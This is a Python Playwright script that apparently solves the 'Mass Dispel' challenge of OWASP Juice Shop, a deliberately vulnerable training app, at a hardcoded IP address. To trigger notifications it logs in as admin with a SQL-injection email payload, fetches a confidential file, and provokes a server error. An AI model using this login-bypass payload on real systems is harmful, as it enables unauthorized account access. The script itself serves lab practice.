#!/usr/bin/env python3
"""
Mass Dispel Challenge Solver
Close multiple "Challenge solved"-notifications in one go
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_mass_dispel():
    """Solve Mass Dispel by closing multiple notifications at once"""
    
    print("🔔 MASS DISPEL CHALLENGE")
    print("=" * 60)
    print("Goal: Close multiple 'Challenge solved'-notifications in one go")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser
        page = browser.new_page()
        
        # Step 1: Navigate to the site
        print("\n📍 Step 1: Navigate to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Step 2: Trigger multiple challenges quickly to get multiple notifications
        print("\n📍 Step 2: Solving multiple easy challenges to trigger notifications...")
        
        session = requests.Session()
        
        # Login as admin to solve challenges via API
        login_resp = session.post(
            f"{TARGET}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        
        if login_resp.status_code == 200:
            token = login_resp.json()['authentication']['token']
            session.headers['Authorization'] = f'Bearer {token}'
            print("   ✅ Logged in as admin")
        
        # Trigger multiple challenges quickly
        challenges_to_trigger = [
            # Score Board - just visit the URL
            (f"{TARGET}/#/score-board", "Score Board"),
            # Confidential Document - access forbidden file
            (f"{TARGET}/ftp/acquisitions.md", "Confidential Document"),
            # Privacy Policy - visit privacy policy
            (f"{TARGET}/#/privacy-security/privacy-policy", "Privacy Policy"),
            # Error Handling - provoke an error
            (f"{TARGET}/rest/qr-code/test", "Error Handling")
        ]
        
        print("\n   Triggering challenges rapidly...")
        for url, name in challenges_to_trigger:
            print(f"      - Accessing {name}...")
            try:
                if "score-board" in url or "privacy" in url:
                    # Navigate in browser for client-side challenges
                    page.goto(url, wait_until="domcontentloaded", timeout=5000)
                else:
                    # Use requests for server-side challenges
                    session.get(url, timeout=2)
            except:
                pass
            time.sleep(0.5)  # Small delay to let notifications appear
        
        # Step 3: Wait for multiple notifications to appear
        print("\n📍 Step 3: Waiting for multiple notifications to appear...")
        time.sleep(3)
        
        # Look for notification container
        print("\n📍 Step 4: Looking for multiple notifications...")
        
        # Try different selectors for notifications
        notification_selectors = [
            'simple-notification',
            '.mat-snack-bar-container',
            '[class*="notification"]',
            '[class*="snackbar"]',
            '.challenge-solved-toast',
            '.notification-container'
        ]
        
        notifications = []
        for selector in notification_selectors:
            elements = page.locator(selector).all()
            if elements:
                notifications.extend(elements)
                print(f"   Found {len(elements)} notifications with selector: {selector}")
        
        if len(notifications) >= 2:
            print(f"\n🎯 Found {len(notifications)} notifications!")
            
            # Step 5: Try to close them all at once
            print("\n📍 Step 5: Attempting to close all notifications at once...")
            
            # Method 1: Press ESC key to dismiss all
            print("   Method 1: Pressing ESC key...")
            page.keyboard.press("Escape")
            time.sleep(1)
            
            # Method 2: Click on overlay/backdrop if exists
            overlay = page.locator('.cdk-overlay-backdrop, .notification-overlay').first
            if overlay.is_visible():
                print("   Method 2: Clicking overlay...")
                overlay.click()
                time.sleep(1)
            
            # Method 3: Find and click a "close all" button if it exists
            close_all_btn = page.locator('button:has-text("Close All"), button:has-text("Dismiss All"), button[aria-label*="close all"]').first
            if close_all_btn.is_visible():
                print("   Method 3: Clicking 'Close All' button...")
                close_all_btn.click()
                time.sleep(1)
            
            # Method 4: Use keyboard shortcut if available
            print("   Method 4: Trying keyboard shortcuts...")
            page.keyboard.press("Control+Shift+X")  # Common close all shortcut
            time.sleep(0.5)
            page.keyboard.press("Alt+X")  # Alternative
            time.sleep(0.5)
            
            # Method 5: Click outside the notifications
            print("   Method 5: Clicking outside notifications...")
            page.mouse.click(100, 100)  # Click in empty area
            
        else:
            print(f"\n⚠️ Only found {len(notifications)} notification(s), need multiple")
            print("   Trying to trigger more challenges...")
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/mass_dispel.png")
        print("\n📸 Screenshot saved: mass_dispel.png")
        
        browser.close()
    
    # Check if challenge is solved
    print("\n📊 Checking challenge status...")
    
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            
            mass_dispel = next((c for c in challenges 
                               if 'Mass Dispel' in c.get('name', '')), None)
            
            if mass_dispel:
                if mass_dispel.get('solved', False):
                    print(f"\n✅ SUCCESS! {mass_dispel['name']} SOLVED!")
                    print(f"   Category: {mass_dispel.get('category')}")
                    print(f"   Difficulty: {mass_dispel.get('difficulty')}")
                    return True
                else:
                    print(f"\n⚠️ {mass_dispel['name']} not solved yet")
                    print("   Need to dismiss multiple notifications simultaneously")
    
    print("\n💡 Tips:")
    print("   1. Trigger multiple challenges to get multiple notifications")
    print("   2. Find a way to dismiss them all at once (ESC key, click outside, etc.)")
    print("   3. The key is having multiple notifications visible at the same time")
    
    return False

if __name__ == "__main__":
    solve_mass_dispel()